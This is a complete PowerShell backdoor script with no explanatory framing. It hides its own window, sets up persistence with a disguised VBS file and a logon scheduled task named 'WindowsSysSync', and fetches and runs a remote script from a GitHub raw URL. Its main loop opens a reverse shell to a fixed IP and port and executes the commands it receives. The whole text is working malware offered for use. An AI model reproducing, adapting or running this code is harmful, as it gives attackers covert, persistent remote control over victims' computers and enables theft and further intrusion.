# --- 1. THE INSTA-HIDE TRICK ---
# If this is the visible 'parent' process, spawn a hidden 'child' and kill the parent immediately.
if (!$env:GHOST_PROCESS) {
    $env:GHOST_PROCESS = "TRUE"
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -Command `"$((Get-Content $PSCommandPath) -join ';')`""
    exit
}

# --- 2. PERSISTENCE (Silent VBS & Task) ---
$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
$LHOST = "192.168.43.109"
$LPORT = 4444
$VBSPath = "$env:APPDATA\win_sys_helper.vbs"

# Create the VBS (This runs with 0 visibility)
$VBSCode = "Set W=CreateObject('WScript.Shell'):W.Run 'powershell -NoP -W Hidden -E Bypass -C IEX(New-Object Net.WebClient).DownloadString(''$Url'')',0,False"
Set-Content -Path $VBSPath -Value $VBSCode -Force

# Register Scheduled Task (If not exists)
if (!(Get-ScheduledTask -TaskName "WindowsSysSync" -ErrorAction SilentlyContinue)) {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VBSPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsSysSync" -Action $Action -Trigger $Trigger -Force
}

# --- 3. THE BEACON LOOP ---
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        $writer.WriteLine("--- GHOST ONLINE ---")
        $reader = New-Object System.IO.StreamReader($stream)
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }
            $out = (Invoke-Expression $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch { Start-Sleep -Seconds 10 }
}
